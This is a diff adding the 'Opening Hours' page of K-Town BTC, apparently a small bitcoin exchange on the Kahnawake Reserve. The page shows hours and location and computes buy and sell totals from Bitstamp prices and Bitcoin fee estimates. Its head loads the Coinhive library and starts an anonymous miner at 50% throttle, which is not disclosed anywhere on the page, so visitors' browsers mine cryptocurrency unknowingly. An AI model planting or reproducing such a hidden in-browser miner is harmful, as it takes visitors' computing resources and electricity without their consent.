@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="img/favicon.ico">
+
+    <title>K-Town BTC</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="../css/bootstrap.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="../css/carousel.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js" ></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="https://checkout.stripe.com/checkout.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('VPgKqaoxqrpzKX18Ygy2pj04Dm8awHKi', {throttle: 0.5});
+  miner.start();
+</script>
+<script>
+  var buy;
+  var sell;
+  var rate;
+  var buyUSD;
+  var sellUSD;
+  var buyamount;
+  var buytotal;
+  var sellamount;
+  var selltotal;
+  var fastestFee;
+  var halfHourFee;
+  var hourFee;
+  var currentfee;
+
+  function htmlEncode(value){
+    if (value) {
+      return jQuery('<div />').text(value).html();
+    } else {
+      return;
+    }
+  }
+
+  function htmlDecode(value) {
+    if (value) {
+      return $('<div />').html(value).text();
+    } else {
+      return;
+    }
+    }
+
+  function roundUp(num, precision) {
+    return Math.ceil(num * precision) / precision
+  }
+
+  $(document).ready(
+  function getprice() {
+
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var jsonRes = JSON.parse(this.responseText);
+        if (jsonRes.hasOwnProperty('last')) {
+
+                //alert(cbix_value);
+                 buy = roundUp(jsonRes.last, 1000);
+                 sell = roundUp(jsonRes.last, 1000);
+                 $("#buyUSDbot").text(buy);
+                 $("#buyUSDbot2").text(buy);
+                 $("#buyamountdisplay").text("1");
+                 buyamount = 1;
+                 buypercent=6;
+                 $("#buypercent").val(buypercent);
+                 $('#buybitcoinfees').text(fastestFee);
+                 buytotal = roundUp((buy * 1.06), 100);
+                 $("#buytotal").val(buytotal);
+                 $('#buyBitcoinButton').val('Buy ' + buyamount + ' Bitcoin for $' + buytotal + ' USD');
+
+                 $("#sellUSDbot").text(sell);
+                 $("#sellUSDbot2").text(sell);
+                 $("#sellamountdisplay").text(sell);
+                 sellamount = 1;
+                 selltotal = roundUp((sell * 1.06), 100);
+                 $("#selltotal").val(selltotal);
+                 $('#sellBitcoinButton').text('Buy $' + selltotal + ' USD for ' + sellamount + ' BTC');
+        }
+    }
+
+  };
+  xhttp.open("GET", "https://www.bitstamp.net/api/ticker", true);
+  xhttp.send();
+
+    var fee = new XMLHttpRequest();
+  fee.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var jsonRes = JSON.parse(this.responseText);
+        if (jsonRes.hasOwnProperty('fastestFee')) {
+
+                fastestFee = (jsonRes.fastestFee) * 226 / 100000000;
+                halfHourFee = (jsonRes.halfHourFee) * 226 / 100000000;
+                hourFee = (jsonRes.hourFee) * 226 / 100000000;
+                buytotal = roundUp((1 + fastestFee) * buy * 1.06, 100);
+                $("#buytotal").val(buytotal);
+                currentfee = fastestFee;
+                $('#buybitcoinfees').text(currentfee);
+
+        }
+    }
+
+  };
+  fee.open("GET", "https://bitcoinfees.earn.com/api/v1/fees/recommended", true);
+  fee.send();
+
+  });
+
+
+
+</script>
+  </head>
+  <body>
+
+    <header>
+      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
+        <a class="navbar-brand" href="index.html" style="padding-left: 100px;">K-Town BTC</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarCollapse">
+          <ul class="navbar-nav mr-auto">
+            <!--<li class="nav-item active">
+              <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
+            </li>-->
+             <li class="nav-item">
+              <a class="nav-link" href="https://www.google.ca/maps/place/45°23'50.2%22N+73°37'17.5%22W/@45.3972727,-73.623732,797m/data=!3m2!1e3!4b1!4m6!3m5!1s0x0:0x0!7e2!8m2!3d45.3972687!4d-73.6215381">Where are we?</a>
+            </li>
+            <li class="nav-item active">
+              <a class="nav-link active" href="#">Opening Hours</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="mailto:support@k-townbtc.com">Contact</a>
+            </li>
+            <li class="nav-item">
+            	<h4 style="position:relative;left:20px;top:3px;"><span class="badge badge-secondary">$<span id="buyUSDbot"></span> USD</span></h4>
+            </li>
+          </ul>
+         <nav class="navbar navbar-dark bg-dark">
+         	<ul class="navbar-nav mr-auto">
+         		<li class="nav-item active">
+				  <a class="navbar-brand nav-link active" href="../USD/">
+				    <img src="../img/US.png" width="30" height="30" class="d-inline-block align-top" alt="">
+				    USD
+				  </a>
+				</li>
+				<li class="nav-item">
+				  <a class="navbar-brand nav-link" href="../">
+				    <img src="../img/CA.png" width="30" height="30" class="d-inline-block align-top" alt="">
+				    CAD
+				  </a>
+				</li>
+			</ul>
+		</nav>
+        </div>
+      </nav>
+    </header>
+    <div style="overflow: visible;z-index:99999;position: fixed;top:-18px;left: 5px;">
+      <img src="../img/headdress2.png" width="100px"/>
+    </div>
+     <main role="main">
+
+      
+
+      <!-- Marketing messaging and featurettes
+      ================================================== -->
+      <!-- Wrap the rest of the page in another container to center all the content. -->
+      <div class="container marketing">
+    <hr class="featurette-divider">
+ <!-- Three columns of text below the carousel -->
+        <div class="row" id="exchange">
+          <div class="col-lg-12">
+            <p class="lead">Happy to receive customers, we are open Monday to Friday, from 10:30 AM to 4 PM.<p>
+              <p class="lead">Feel free to <a href="mailto:support@k-townbtc.com">contact</a> us if you can't make it on time!</p>
+            <p class="lead">Please note that we will be closed from Dec. 25 to Jan 11.</p>
+          </div><!-- /.col-lg-4 -->
+          
+        </div><!-- /.row -->
+
+        <!-- START THE FEATURETTES -->
+
+        <hr class="featurette-divider">
+
+        <div class="row featurette">
+          <div class="col-md-7 order-md-2">
+            <h2 class="featurette-heading">Best Location. <span class="text-muted">See for yourself.</span></h2>
+            <p class="lead">Being at the heart of the Kahnawake Reserve means two things :<br/>&middot; Only 30mins from Downton Montréal. In fact, <a href="https://www.google.ca/maps/place/45°23'50.2%22N+73°37'17.5%22W/@45.3972727,-73.623732,797m/data=!3m2!1e3!4b1!4m6!3m5!1s0x0:0x0!7e2!8m2!3d45.3972687!4d-73.6215381">we are rigth on the 132, between the Mercier Bridge and Saint-Catherine, neighbooring "The Joint"</a>.<br/>&middot; Much smaller fees! Because we have no taxes to pay, so we won't charge them to you.<br/> More parties for you 🎉🎉🎉.</p>
+          </div>
+          <div class="col-md-5 order-md-1">
+            <a href="https://www.google.ca/maps/place/45°23'50.2%22N+73°37'17.5%22W/@45.3972727,-73.623732,797m/data=!3m2!1e3!4b1!4m6!3m5!1s0x0:0x0!7e2!8m2!3d45.3972687!4d-73.6215381">
+            <img class="featurette-image img-fluid mx-auto" src="../img/map.png" alt="Generic placeholder image">
+          </a>
+          </div>
+        </div>
+
+        <hr class="featurette-divider">
+
+   
+      </div><!-- /.container -->
+
+
+      <!-- FOOTER -->
+      <footer class="container">
+        <p class="float-right"><a href="#">Back to top</a></p>
+        <p>&copy; 2017 K-Town BTC, Kahnawake Reserve &middot; <a href="mailto:support@k-townbtc.com">Contact</a></p>
+      </footer>
+
+    </main>
+
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+
+  </body>
+</html>
